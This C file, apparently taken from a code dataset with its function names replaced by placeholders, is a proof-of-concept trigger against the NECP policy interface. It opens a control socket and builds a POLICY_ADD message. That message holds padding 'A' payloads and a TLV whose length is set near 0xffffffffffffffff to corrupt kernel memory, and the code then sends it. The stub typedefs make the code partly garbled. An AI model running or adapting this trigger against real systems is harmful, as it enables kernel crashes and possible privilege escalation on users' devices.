#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int uint8_t ;
typedef  int uint32_t ;
struct necp_packet_header {int packet_type; scalar_t__ message_id; scalar_t__ flags; } ;

/* Variables and functions */
 int* FUNC0 (int*,int,int,int*,int) ; 
 int* FUNC1 (int*,int,int,int*) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int FUNC3 () ; 
 int* FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (int*,char,int) ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 int /*<<< orphan*/  FUNC7 (int,int*,size_t,int /*<<< orphan*/ ) ; 

int FUNC8(){
  int fd = FUNC3();
  if (fd < 0) {
    FUNC6("failed to get control socket :(\n");
    return 1;
  }
  FUNC6("got a control socket! %d\n", fd);

  size_t msg_size;
  uint8_t* msg = FUNC4(0x1000);
  FUNC5(msg, 0, 0x1000);

  uint8_t* payload = FUNC4(0x1000);
  FUNC5(payload, 'A', 0x1000);

  struct necp_packet_header* hdr = (struct necp_packet_header*) msg;
  hdr->packet_type = 1; // POLICY_ADD
  hdr->flags = 0;
  hdr->message_id = 0;

  uint8_t* buf = (uint8_t*)(hdr+1);

  uint32_t order = 0x41414141;
  buf = FUNC1(buf, 2, 4, &order); // NECP_TLV_POLICY_ORDER

  uint8_t policy = 1; // NECP_POLICY_RESULT_PASS
  buf = FUNC1(buf, 4, 1, &policy); // NECP_TLV_POLICY_RESULT
  
  buf = FUNC1(buf, 3, 1, payload); // NECP_TLV_POLICY_CONDITION
  buf = FUNC1(buf, 3, 1024, payload); // NECP_TLV_POLICY_CONDITION
  
  buf = FUNC0(buf, 3, 0xffffffffffffffff-1050, payload, 0x10);

  msg_size = buf - msg;

  FUNC7(fd, msg, msg_size, 0);

  FUNC2(fd);
  return 0;
}